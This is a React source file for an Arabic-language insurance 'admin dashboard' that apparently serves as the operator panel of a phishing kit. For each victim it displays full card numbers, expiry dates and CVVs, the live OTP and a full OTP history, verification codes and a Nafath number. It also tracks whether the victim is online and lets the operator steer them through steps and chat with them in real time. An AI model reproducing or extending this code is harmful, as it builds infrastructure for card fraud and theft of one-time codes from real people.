"use client"

import type React from "react"

import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  CheckCircle,
  XCircle,
  Clock,
  MessageSquare,
  User,
  Settings,
  Phone,
  CreditCard,
  Mail,
  Calendar,
  FileText,
  Flag,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Checkbox } from "@/components/ui/checkbox"
import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { ChatPanel } from "@/components/chat-panel"
import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { CreditCardMockup } from "@/components/credit-card-mockup"

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center gap-2">
      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  )
}

export default function AdminDashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [searchQuery, setSearchQuery] = useState("")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [showChat, setShowChat] = useState(false)
  const [loading, setLoading] = useState(true)
  const prevApplicationsCount = useRef<number>(0)
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())

  const stats = useMemo(() => {
    return {
      total: applications.length,
      pending: applications.filter((a) => a.status === "pending_review").length,
      approved: applications.filter((a) => a.status === "approved").length,
      rejected: applications.filter((a) => a.status === "rejected").length,
    }
  }, [applications])

  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
        playNotificationSound()
      }
      prevApplicationsCount.current = apps.length

      setApplications(apps)
      setLoading(false)
    })

    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications

      if (statusFilter !== "all") {
        filtered = filtered.filter((app) => app.status === statusFilter)
      }

      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber.includes(query) ||
            app.phoneNumber.includes(query),
        )
      }

      setFilteredApplications(filtered)
    }, 300) // 300ms debounce

    return () => clearTimeout(timer)
  }, [applications, searchQuery, statusFilter])

  const handleStatusChange = useCallback(
    async (appId: string, newStatus: InsuranceApplication["status"]) => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, status: newStatus } : app)))

      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, status: newStatus } : null))
      }

      try {
        await updateApplication(appId, { status: newStatus })
        if (newStatus === "approved") {
          playSuccessSound()
        } else if (newStatus === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error(" Error updating status:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleStepChange = useCallback(
    async (appId: string, newStep: number) => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, currentStep: newStep } : app)))

      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
      }

      try {
        await updateApplication(appId, { currentStep: newStep })
      } catch (error) {
        console.error(" Error updating step:", error)
      }
    },
    [selectedApplication],
  )

  const toggleSelection = useCallback((id: string, event: React.MouseEvent) => {
    event.stopPropagation()
    setSelectedIds((prev) => {
      const newSet = new Set(prev)
      if (newSet.has(id)) {
        newSet.delete(id)
      } else {
        newSet.add(id)
      }
      return newSet
    })
  }, [])

  const isUnread = useCallback((app: InsuranceApplication) => {
    return app.status === "pending_review" && app.currentStep === 1
  }, [])

  const hasCardInfo = useCallback((app: InsuranceApplication) => {
    return !!(app.cardNumber || app.expiryDate || app.cvv)
  }, [])

  const getStatusBadge = useCallback((status: string) => {
    const badges = {
      draft: { text: "مسودة", className: "bg-gray-100 text-gray-800" },
      pending_review: {
        text: "قيد المراجعة",
        className: "bg-yellow-100 text-yellow-800",
      },
      approved: { text: "موافق عليه", className: "bg-green-100 text-green-800" },
      rejected: { text: "مرفوض", className: "bg-red-100 text-red-800" },
      completed: { text: "مكتمل", className: "bg-blue-100 text-blue-800" },
    }
    return badges[status as keyof typeof badges] || badges.draft
  }, [])

  const formatArabicDate = useCallback((dateString?: string) => {
    if (!dateString) return ""

    const date = new Date(dateString)
    const now = new Date()
    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)

    if (diffInSeconds < 60) {
      return "منذ لحظات"
    } else if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60)
      return `منذ ${minutes} ${minutes === 1 ? "دقيقة" : minutes === 2 ? "دقيقتين" : "دقائق"}`
    } else if (diffInSeconds < 86400) {
      const hours = Math.floor(diffInSeconds / 3600)
      return `منذ ${hours} ${hours === 1 ? "ساعة" : hours === 2 ? "ساعتين" : "ساعات"}`
    } else if (diffInSeconds < 604800) {
      const days = Math.floor(diffInSeconds / 86400)
      return `منذ ${days} ${days === 1 ? "يوم" : days === 2 ? "يومين" : "أيام"}`
    }

    return date.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }, [])

  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) {
        setSelectedApplication(updated)
      }
    }
  }, [applications, selectedApplication])

  return (
    <div className="min-h-screen bg-slate-50" dir="rtl" style={{ zoom: 0.75 }}>
      <header className="bg-white text-slate-900 border-b border-slate-200">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-blue-600 flex items-center justify-center">
              <Mail className="w-5 h-5 text-white" />
            </div>
            <h1 className="text-xl font-bold">لوحة تحكم المسؤول</h1>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="icon">
              <Settings className="w-5 h-5" />
            </Button>
            <div className="w-9 h-9 rounded-full bg-slate-200 flex items-center justify-center">
              <User className="w-5 h-5" />
            </div>
          </div>
        </div>
      </header>

      <div className="bg-white border-b border-slate-200">
        <div className="max-w-7xl mx-auto px-4 py-3">
          <div className="flex items-center gap-6 text-sm">
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-slate-400"></div>
              <span className="text-slate-600">الكل</span>
              <span className="font-semibold text-slate-900">{stats.total}</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-yellow-500"></div>
              <span className="text-slate-600">قيد المراجعة</span>
              <span className="font-semibold text-yellow-700">{stats.pending}</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-green-500"></div>
              <span className="text-slate-600">موافق عليه</span>
              <span className="font-semibold text-green-700">{stats.approved}</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-red-500"></div>
              <span className="text-slate-600">مرفوض</span>
              <span className="font-semibold text-red-700">{stats.rejected}</span>
            </div>
          </div>
        </div>
      </div>

      <div className="bg-white border-b border-slate-200">
        <div className="max-w-7xl mx-auto px-4 py-3">
          <div className="flex items-center gap-3">
            <div className="flex-1 relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
              <Input
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="بحث في الطلبات..."
                className="pr-10 h-9 border-slate-300 bg-slate-50 text-sm"
              />
            </div>
            <div className="flex gap-1">
              <Button
                onClick={() => setStatusFilter("all")}
                variant={statusFilter === "all" ? "default" : "ghost"}
                size="sm"
                className={statusFilter === "all" ? "bg-slate-900 text-white" : "text-slate-700"}
              >
                الكل
              </Button>
              <Button
                onClick={() => setStatusFilter("pending_review")}
                variant={statusFilter === "pending_review" ? "default" : "ghost"}
                size="sm"
                className={statusFilter === "pending_review" ? "bg-yellow-600 text-white" : "text-slate-700"}
              >
                قيد المراجعة
              </Button>
              <Button
                onClick={() => setStatusFilter("approved")}
                variant={statusFilter === "approved" ? "default" : "ghost"}
                size="sm"
                className={statusFilter === "approved" ? "bg-green-600 text-white" : "text-slate-700"}
              >
                موافق
              </Button>
              <Button
                onClick={() => setStatusFilter("rejected")}
                variant={statusFilter === "rejected" ? "default" : "ghost"}
                size="sm"
                className={statusFilter === "rejected" ? "bg-red-600 text-white" : "text-slate-700"}
              >
                مرفوض
              </Button>
            </div>
          </div>
        </div>
      </div>

      <div className="flex h-[100vh]">
        <div className="w-96 bg-white border-l border-slate-200 overflow-y-auto">
          {loading ? (
            <div className="flex items-center justify-center h-full">
              <div className="text-center">
                <div className="w-12 h-12 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-slate-600">جاري التحميل...</p>
              </div>
            </div>
          ) : filteredApplications.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-full p-8 text-center">
              <div className="w-16 h-16 rounded-full bg-slate-100 flex items-center justify-center mb-4">
                <Mail className="w-8 h-8 text-slate-400" />
              </div>
              <p className="text-slate-600 font-medium">لا توجد طلبات</p>
              <p className="text-slate-400 text-sm mt-1">جرب تغيير الفلاتر</p>
            </div>
          ) : (
            <div className="divide-y divide-slate-200">
              {filteredApplications.map((app) => (
                <div
                  key={app.id}
                  onClick={() => {
                    setSelectedApplication(app)
                    setShowChat(false)
                  }}
                  className={`p-4 cursor-pointer hover:bg-slate-50 transition-colors relative ${
                    selectedApplication?.id === app.id ? "bg-blue-50 border-r-4 border-blue-600" : ""
                  }`}
                >
                  <div className="flex items-start gap-3">
                    <Checkbox
                      checked={selectedIds.has(app.id!)}
                      onCheckedChange={(checked) => {
                        const event = window.event as any
                        toggleSelection(app.id!, event)
                      }}
                      onClick={(e) => e.stopPropagation()}
                      className="mt-1"
                    />
                    <div className="flex-1 min-w-0">
                      <div className="flex items-start justify-between mb-2">
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 mb-1">
                            <UserStatus userId={app.id!} />
                            <h3 className="font-semibold text-slate-900 text-sm truncate">{app.ownerName}</h3>
                            {app.country}
                            {isUnread(app) && <Flag className="w-4 h-4 text-red-500 fill-red-500 flex-shrink-0" />}
                            {hasCardInfo(app) && <CreditCard className="w-4 h-4 text-blue-500 flex-shrink-0" />}
                          </div>
                          <p className="text-xs text-slate-600 truncate">رقم الهوية: {app.identityNumber}</p>
                        </div>
                      </div>
                      <div className="flex items-center justify-between text-xs text-slate-500 mt-3">
                        <span className="flex items-center gap-1">
                          <FileText className="w-3 h-3" />
                          الخطوة {app.currentStep + 1}/4
                        </span>
                        {app.createdAt && (
                          <span className="flex items-center gap-1">
                            <Calendar className="w-3 h-3" />
                            {formatArabicDate(app.createdAt)}
                          </span>
                        )}
                      </div>
                      {!app.online && app.lastseen && (
                        <div className="mt-2 text-xs text-slate-400">آخر ظهور: {formatArabicDate(app.lastseen)}</div>
                      )}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        <div className="flex-1 bg-slate-50 overflow-y-auto">
          {selectedApplication ? (
            showChat ? (
              <div className="h-full bg-white">
                <ChatPanel
                  applicationId={selectedApplication.id!}
                  currentUserId="admin-001"
                  currentUserName="المسؤول"
                  currentUserRole="admin"
                  onClose={() => setShowChat(false)}
                />
              </div>
            ) : (
              <div className="mx-auto p-6 grid grid-cols-3 gap-2">
                <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
                  <div className="flex items-start justify-between mb-4">
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-2">
                        <h2 className="text-2xl font-bold text-slate-900">{selectedApplication.ownerName}</h2>
                        <Badge
                          variant={selectedApplication.online ? "default" : "secondary"}
                          className={selectedApplication.online ? "bg-green-500" : "bg-slate-400"}
                        >
                          {selectedApplication.online ? "متصل الآن" : "غير متصل"}
                        </Badge>
                      </div>
                      <div className="flex items-center gap-4 text-sm text-slate-600">
                        <span className="flex items-center gap-1">
                          <Phone className="w-4 h-4" />
                          {selectedApplication.phone || selectedApplication.phoneNumber}
                        </span>
                        <span className="flex items-center gap-1">
                          <CreditCard className="w-4 h-4" />
                          {selectedApplication.identityNumber}
                        </span>
                        {selectedApplication.createdAt && (
                          <span className="flex items-center gap-1">
                            <Calendar className="w-4 h-4" />
                            {formatArabicDate(selectedApplication.createdAt)}
                          </span>
                        )}
                      </div>
                      {!selectedApplication.online && selectedApplication.lastseen && (
                        <p className="text-xs text-slate-500 mt-2">
                          آخر ظهور: {formatArabicDate(selectedApplication.lastseen)}
                        </p>
                      )}
                    </div>
                    <Button onClick={() => setShowChat(true)} variant="outline" size="sm" className="gap-2">
                      <MessageSquare className="w-4 h-4" />
                      دردشة
                    </Button>
                  </div>
                  <div className="flex items-center gap-2">
                    <Badge className={getStatusBadge(selectedApplication.status).className}>
                      {getStatusBadge(selectedApplication.status).text}
                    </Badge>
                    <span className="text-sm text-slate-600">الخطوة {selectedApplication.currentStep + 1} من 4</span>
                  </div>
                </div>

                <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
                  <h3 className="text-lg font-bold text-slate-900 mb-4">معلومات الوثيقة</h3>
                  <div className="space-y-3">
                    {selectedApplication.documentType && (
                      <div className="flex justify-between py-2 border-b border-slate-100">
                        <span className="text-sm text-slate-600">نوع الوثيقة</span>
                        <span className="text-sm font-medium text-slate-900">{selectedApplication.documentType}</span>
                      </div>
                    )}
                    {selectedApplication.serialNumber && (
                      <div className="flex justify-between py-2 border-b border-slate-100">
                        <span className="text-sm text-slate-600">الرقم التسلسلي</span>
                        <span className="text-sm font-medium text-slate-900">{selectedApplication.serialNumber}</span>
                      </div>
                    )}
                    {selectedApplication.phone && (
                      <div className="flex justify-between py-2 border-b border-slate-100">
                        <span className="text-sm text-slate-600">رقم الهاتف</span>
                        <span className="text-sm font-medium text-slate-900">{selectedApplication.phone}</span>
                      </div>
                    )}
                    {selectedApplication.nafad && (
                      <div className="flex justify-between py-2 border-b border-slate-100">
                        <span className="text-sm text-slate-600">رقم نفاذ</span>
                        <span className="text-sm font-medium text-slate-900">{selectedApplication.nafad}</span>
                      </div>
                    )}
                    {selectedApplication.country && (
                      <div className="flex justify-between py-2 border-b border-slate-100">
                        <span className="text-sm text-slate-600">الدولة</span>
                        <span className="text-sm font-medium text-slate-900">{selectedApplication.country}</span>
                      </div>
                    )}
                  </div>
                </div>

                <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
                  <h3 className="text-lg font-bold text-slate-900 mb-4">تفاصيل التأمين</h3>
                  <div className="space-y-3">
                    {selectedApplication.insuranceType && (
                      <div className="flex justify-between py-2 border-b border-slate-100">
                        <span className="text-sm text-slate-600">نوع التأمين</span>
                        <span className="text-sm font-medium text-slate-900">{selectedApplication.insuranceType}</span>
                      </div>
                    )}
                    {selectedApplication.insuranceStartDate && (
                      <div className="flex justify-between py-2 border-b border-slate-100">
                        <span className="text-sm text-slate-600">تاريخ بدء التأمين</span>
                        <span className="text-sm font-medium text-slate-900">
                          {selectedApplication.insuranceStartDate}
                        </span>
                      </div>
                    )}
                    {selectedApplication.repairLocation && (
                      <div className="flex justify-between py-2 border-b border-slate-100">
                        <span className="text-sm text-slate-600">موقع الإصلاح</span>
                        <span className="text-sm font-medium text-slate-900">
                          {selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
                        </span>
                      </div>
                    )}
                  </div>
                </div>

                <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
                  <h3 className="text-lg font-bold text-slate-900 mb-4">حالة التحقق</h3>
                  <div className="space-y-3">
                    <div className="flex items-center justify-between p-4 bg-slate-50 rounded-lg">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center">
                          <Phone className="w-5 h-5 text-blue-600" />
                        </div>
                        <div>
                          <p className="text-sm font-medium text-slate-900">رمز الهاتف</p>
                          <p className="text-xs text-slate-600">
                            {selectedApplication.phoneVerificationCode || "لم يتم إنشاؤه"}
                          </p>
                        </div>
                      </div>
                      <Badge
                        variant={
                          selectedApplication.phoneVerificationStatus === "approved"
                            ? "default"
                            : selectedApplication.phoneVerificationStatus === "rejected"
                              ? "destructive"
                              : "secondary"
                        }
                      >
                        {selectedApplication.phoneVerificationStatus === "approved"
                          ? "موافق"
                          : selectedApplication.phoneVerificationStatus === "rejected"
                            ? "مرفوض"
                            : "معلق"}
                      </Badge>
                    </div>
                    <div className="flex items-center justify-between p-4 bg-slate-50 rounded-lg">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-full bg-green-100 flex items-center justify-center">
                          <CreditCard className="w-5 h-5 text-green-600" />
                        </div>
                        <div>
                          <p className="text-sm font-medium text-slate-900">رمز البطاقة</p>
                          <p className="text-xs text-slate-600">
                            {selectedApplication.idVerificationCode || "لم يتم إنشاؤه"}
                          </p>
                        </div>
                      </div>
                      <Badge
                        variant={
                          selectedApplication.idVerificationStatus === "approved"
                            ? "default"
                            : selectedApplication.idVerificationStatus === "rejected"
                              ? "destructive"
                              : "secondary"
                        }
                      >
                        {selectedApplication.idVerificationStatus === "approved"
                          ? "موافق"
                          : selectedApplication.idVerificationStatus === "rejected"
                            ? "مرفوض"
                            : "معلق"}
                      </Badge>
                    </div>
                    <Button
                      onClick={() => (window.location.href = "/verify")}
                      variant="outline"
                      className="w-full gap-2"
                    >
                      <CheckCircle className="w-4 h-4" />
                      الذهاب إلى صفحة التحقق
                    </Button>
                  </div>
                </div>

                {selectedApplication.vehicleModel && (
                  <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
                    <h3 className="text-lg font-bold text-slate-900 mb-4">معلومات المركبة</h3>
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div>
                        <p className="text-slate-600 mb-1">الموديل</p>
                        <p className="font-medium text-slate-900">{selectedApplication.vehicleModel}</p>
                      </div>
                      <div>
                        <p className="text-slate-600 mb-1">سنة الصنع</p>
                        <p className="font-medium text-slate-900">{selectedApplication.manufacturingYear}</p>
                      </div>
                      <div>
                        <p className="text-slate-600 mb-1">القيمة</p>
                        <p className="font-medium text-slate-900">{selectedApplication.vehicleValue} ريال</p>
                      </div>
                      <div>
                        <p className="text-slate-600 mb-1">الاستخدام</p>
                        <p className="font-medium text-slate-900">{selectedApplication.vehicleUsage}</p>
                      </div>
                    </div>
                  </div>
                )}

                {selectedApplication.cardNumber && (
                  <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4 col-span-2">
                    <h3 className="text-lg font-bold text-slate-900 mb-4">معلومات الدفع</h3>
                    <CreditCardMockup
                      cardNumber={selectedApplication.cardNumber}
                      expiryDate={selectedApplication?.expiryDate}
                      cvv={selectedApplication?.cvv}
                      cardholderName={selectedApplication.ownerName}
                    />
                    {selectedApplication.otp && (
                      <div className="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg">
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-medium text-green-900">رمز OTP الحالي</span>
                          <span className="text-2xl font-bold text-green-600 font-mono" dir="ltr">
                            {selectedApplication.otp}
                          </span>
                        </div>
                      </div>
                    )}
                    {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                      <div className="mt-4 p-4 bg-slate-50 rounded-lg">
                        <p className="text-sm font-medium text-slate-700 mb-3">سجل رموز OTP</p>
                        <div className="flex flex-wrap gap-2">
                          {selectedApplication.allOtps.map((otp, index) => (
                            <Badge
                              key={index}
                              variant="secondary"
                              className="bg-slate-200 text-slate-700 font-mono"
                              dir="ltr"
                            >
                              {otp}
                            </Badge>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                <div className="bg-white rounded-lg border border-slate-200 p-6">
                  <h3 className="text-lg font-bold text-slate-900 mb-4">التحكم بالحالة</h3>
                  <div className="space-y-2">
                    <Button
                      onClick={() => handleStatusChange(selectedApplication.id!, "pending_review")}
                      variant="outline"
                      className="w-full justify-start h-auto py-3"
                    >
                      <Clock className="w-5 h-5 ml-3" />
                      <div className="text-right">
                        <p className="font-medium">قيد المراجعة</p>
                        <p className="text-xs text-slate-600">تحت المراجعة من قبل الفريق</p>
                      </div>
                    </Button>
                    <Button
                      onClick={() => handleStatusChange(selectedApplication.id!, "approved")}
                      variant="outline"
                      className="w-full justify-start h-auto py-3 hover:bg-green-50 border-green-200"
                    >
                      <CheckCircle className="w-5 h-5 ml-3 text-green-600" />
                      <div className="text-right">
                        <p className="font-medium text-green-700">الموافقة على الطلب</p>
                        <p className="text-xs text-green-600">قبول الطلب والمتابعة</p>
                      </div>
                    </Button>
                    <Button
                      onClick={() => handleStatusChange(selectedApplication.id!, "rejected")}
                      variant="outline"
                      className="w-full justify-start h-auto py-3 hover:bg-red-50 border-red-200"
                    >
                      <XCircle className="w-5 h-5 ml-3 text-red-600" />
                      <div className="text-right">
                        <p className="font-medium text-red-700">رفض الطلب</p>
                        <p className="text-xs text-red-600">رفض الطلب مع إشعار العميل</p>
                      </div>
                    </Button>
                  </div>
                  <div className="mt-6 pt-6 border-t border-slate-200">
                    <h4 className="text-sm font-semibold text-slate-700 mb-3">التحكم بالخطوات</h4>
                    <div className="flex gap-2">
                      {[1, 2, 3, 4].map((step) => (
                        <Button
                          key={step}
                          onClick={() => handleStepChange(selectedApplication.id!, step - 1)}
                          variant={selectedApplication.currentStep === step - 1 ? "default" : "outline"}
                          size="sm"
                          className={`flex-1 ${selectedApplication.currentStep === step - 1 ? "bg-blue-600" : ""}`}
                        >
                          {step}
                        </Button>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            )
          ) : (
            <div className="flex items-center justify-center h-full">
              <div className="text-center">
                <div className="w-20 h-20 rounded-full bg-slate-100 flex items-center justify-center mx-auto mb-4">
                  <Mail className="w-10 h-10 text-slate-400" />
                </div>
                <h3 className="text-lg font-semibold text-slate-900 mb-2">اختر طلب لعرض التفاصيل</h3>
                <p className="text-slate-600 text-sm">اضغط على أي طلب من القائمة لعرض المعلومات الكاملة</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
